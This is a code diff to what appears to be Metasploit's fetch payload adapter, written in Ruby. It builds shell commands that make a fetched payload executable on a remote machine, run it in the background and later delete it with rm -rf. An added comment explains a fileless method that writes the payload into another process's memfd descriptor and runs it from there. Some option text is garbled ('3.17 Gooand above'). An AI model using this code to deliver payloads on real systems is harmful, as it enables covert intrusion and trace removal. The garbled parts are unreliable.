@@ -4,7 +4,7 @@ module Msf::Payload::Adapter::Fetch
     register_options(
       [
         Msf::OptBool.new('FETCH_DELETE', [true, 'Attempt to delete the binary after execution', false]),
-        Msf::OptBool.new('FETCH_FILELESS', [true, 'Attempt to run payload without touching disk (only Unix)', false]),
+        Msf::OptBool.new('FETCH_FILELESS', [true, 'Attempt to run payload without touching disk (only *nix, kernel version 3.17 Gooand above)', false]),
         Msf::OptString.new('FETCH_FILENAME', [ false, 'Name to use on remote system when storing payload; cannot contain spaces or slashes', Rex::Text.rand_text_alpha(rand(8..12))], regex: %r{^[^\s/\\]*$}),
         Msf::OptPort.new('FETCH_SRVPORT', [true, 'Local port to use for serving payload', 8080]),
         # FETCH_SRVHOST defaults to LHOST, but if the payload doesn't connect back to Metasploit (e.g. adduser, messagebox, etc.) then FETCH_SRVHOST needs to be set
@@ -206,16 +206,9 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _execute_nix
-    if datastore['FETCH_DELETE']
-      rand(3..7)
-      # create anonymous file ? -> /proc/$pid/fd/$fd
-      cmds = %{;tmpfile=$(mktemp);exec #{fd}<> "$tmpfile"; rm -f "$tmpfile"}
-
-    else
-      cmds = ";chmod +x #{_remote_destination_nix}"
-      cmds << ";#{_remote_destination_nix}&"
-    end
-    # cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
+    cmds = ";chmod +x #{_remote_destination_nix}"
+    cmds << ";#{_remote_destination_nix}&"
+    cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
     cmds
   end
 
@@ -234,6 +227,7 @@ module Msf::Payload::Adapter::Fetch
     cmd + _execute_add
   end
 
+  # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
   def _generate_fileless(get_file_cmd)
     # get list of all $USER's processes
     cmd = 'FOUND=0'
